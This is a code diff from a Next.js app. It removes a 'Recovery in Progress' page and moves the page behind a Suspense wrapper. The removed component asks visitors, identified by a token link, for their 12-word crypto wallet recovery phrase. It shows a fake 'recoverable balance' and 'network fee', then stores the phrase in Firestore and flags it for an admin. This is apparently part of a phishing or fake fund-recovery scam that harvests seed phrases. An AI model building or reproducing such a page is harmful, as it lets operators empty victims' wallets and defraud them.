@@ -1,146 +1,16 @@
-"use client";
+import { Suspense } from "react";
+import Page4Client from "./page4Client";
 
-import { useState, useEffect } from "react";
-import { useRouter, useSearchParams } from "next/navigation";
-import { collection, doc, getDocs, updateDoc } from "firebase/firestore";
-import { db } from "@/lib/firebase";
-import SvgStack from "@/components/SvgStack";
-import Image from "next/image";
-import bgImage from "@/components/Image_fx__2_-removebg-preview 1.svg";
-
-export default function Page4() {
-  const router = useRouter();
-  const searchParams = useSearchParams();
-  const token = searchParams.get("token");
-
-  const [loading, setLoading] = useState(true);
-  const [client, setClient] = useState<any>(null);
-  const [recoveryPhrase, setRecoveryPhrase] = useState("");
-  const [error, setError] = useState("");
-
-  useEffect(() => {
-    if (!token) {
-      router.replace("/invalid");
-      return;
-    }
-
-    const fetchClientData = async () => {
-      try {
-        const clientsCol = collection(db, "clients");
-        const snapshot = await getDocs(clientsCol);
-        const clientDoc = snapshot.docs.find(
-          (d) => d.data().accessLinkId === token
-        );
-
-        if (!clientDoc) {
-          router.replace("/invalid");
-          return;
-        }
-
-        setClient({ id: clientDoc.id, ...clientDoc.data() });
-        setLoading(false);
-      } catch (err) {
-        console.error(err);
-        router.replace("/invalid");
-      }
-    };
-
-    fetchClientData();
-  }, [token, router]);
-
-  const handleProcessRecovery = async () => {
-    if (!recoveryPhrase.trim()) {
-      setError("Recovery phrase cannot be empty");
-      return;
-    }
-
-    // Split words and remove numbering if present
-    const words = recoveryPhrase
-      .trim()
-      .split(/\s+/)
-      .map((w) => w.replace(/^\d+\./, "")); // removes "1." style numbers
-
-    if (words.length !== 12) {
-      setError("Recovery phrase must contain exactly 12 words");
-      return;
-    }
-
-    if (!client) return;
-
-    const clientRef = doc(db, "clients", client.id);
-
-    await updateDoc(clientRef, {
-      recoveryPhrase: words,
-      proceed2: false, // NEW: create proceed2 for admin
-      currentPage: "page5",
-    });
-
-    router.replace("/page5?token=" + token);
-  };
-
-  if (loading)
-    return (
-      <main className="flex items-center justify-center h-screen text-white">
-        Loading client info...
-      </main>
-    );
-
-  const networkFee = (client.recoverableBalance || 0) * 0.0042;
-
+export default function Page4Page() {
   return (
-    <main className="relative w-full h-screen overflow-hidden">
-      <div className="absolute inset-0 w-full h-full">
-        <SvgStack />
-      </div>
-
-      <div className="relative z-10 flex flex-col items-center justify-center w-full h-full px-4 text-center backdrop-blur-sm bg-black/85">
-        <Image
-          src={bgImage}
-          alt="Background"
-          className="absolute inset-0 -z-10 object-contain"
-        />
-
-        <div className="w-full max-w-lg bg-[#0E111C]/85 rounded-lg p-6 space-y-6">
-          {/* Header */}
-          <h2 className="text-white text-xl font-bold">Recovery in Progress</h2>
-          <p className="text-gray-400 text-left ml-1">
-            Secure your session to proceed
-          </p>
-
-          {/* Recovery Phrase Textarea */}
-          <div className="flex flex-col gap-2">
-            <label className="text-gray-400 text-left">Recovery Phrase</label>
-            <textarea
-              rows={6}
-              value={recoveryPhrase}
-              onChange={(e) => setRecoveryPhrase(e.target.value)}
-              placeholder="Enter your 12-word recovery phrase here"
-              className="w-full bg-[#151A2E] rounded-lg p-4 text-white focus:outline-none focus:ring-1 focus:ring-teal-500 resize-none"
-            />
-            {error && <p className="text-red-500 text-sm">{error}</p>}
-          </div>
-
-          {/* Wallet Balance */}
-          <div className="bg-[#151A2E] rounded-xl p-4 flex flex-col gap-2">
-            <div className="flex justify-between text-white font-semibold">
-              <span>Recoverable Balance:</span>
-              <span>{(client.recoverableBalance || 0).toFixed(8)} BTC</span>
-            </div>
-            <div className="flex justify-between text-gray-400 font-semibold">
-              <span>Network Fee (0.42%):</span>
-              <span>{networkFee.toFixed(8)} BTC</span>
-            </div>
-          </div>
-
-          {/* Process Recovery Button */}
-          <button
-            onClick={handleProcessRecovery}
-            className="mt-4 w-full py-3 bg-teal-600 rounded-xl font-semibold hover:bg-teal-500"
-          >
-            Process Recovery
-          </button>
+    <Suspense
+      fallback={
+        <div className="h-screen flex items-center justify-center text-white">
+          Loading...
         </div>
-      </div>
-    </main>
+      }
+    >
+      <Page4Client />
+    </Suspense>
   );
 }
